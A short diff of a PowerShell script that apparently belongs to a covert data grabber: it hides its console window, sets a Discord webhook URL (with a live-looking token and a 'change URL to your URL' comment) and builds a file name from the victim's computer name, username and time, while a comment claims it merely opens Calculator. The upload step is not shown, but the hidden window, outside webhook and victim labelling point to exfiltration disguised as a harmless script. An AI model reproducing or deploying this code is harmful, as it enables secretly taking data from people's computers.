@@ -1,6 +1,3 @@
-#CHANGE URL TO YOUR URL
-  $url="https://discord.com/api/webhooks/1304083148660936744/LB8MgmVSEMaOT3MxACw7ezFS08UU9gRAX7ybyWErvnvkrWtSwDGsXcWLATOPZASDFMYC" ;
-  
 # PowerShell script to hide the command line window and open Calculator
 Add-Type -TypeDefinition @"
 using System;
@@ -19,6 +16,9 @@ public class Window {
 
 # Hide the current PowerShell console window
 [Window]::HideWindow()
+
+#CHANGE URL TO YOUR URL
+  $url="https://discord.com/api/webhooks/1304083148660936744/LB8MgmVSEMaOT3MxACw7ezFS08UU9gRAX7ybyWErvnvkrWtSwDGsXcWLATOPZASDFMYC" ;
 
 #Get PC Name+Date+Time
   $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
